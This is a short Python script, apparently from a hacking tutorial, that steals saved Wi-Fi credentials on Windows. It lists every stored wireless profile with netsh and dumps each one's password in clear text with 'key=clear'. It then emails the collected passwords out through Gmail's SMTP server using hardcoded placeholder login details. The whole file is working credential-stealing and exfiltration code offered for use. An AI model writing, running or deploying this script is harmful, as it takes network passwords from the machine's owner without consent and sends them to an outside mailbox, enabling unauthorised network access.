#!/usr/bin/env python

import subprocess, smtplib, re

def send_mail(email, password, message):
    #google server and port for SMTP server instance to send a mail
    server=smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    #send mail to myself the info of the executed command
    server.sendmail(email, email, message)
    server.quit()

#all wifi's connected anytime
command= "netsh wlan show profile"
networks=subprocess.check_output(command, shell=True)
#regex for capturing the network names as a list
network_names_list=re.findall("(?:Profile\s*:\s)(.*)", networks)

result= ""
for network_name in network_names_list:
    command= "netsh wlan show profile "+ network_name + " key=clear"
    current_result=subprocess.check_output(command,shell=True)
    result=result+current_result


#send results to my mail by calling the function
send_mail("email", "passwd", result)
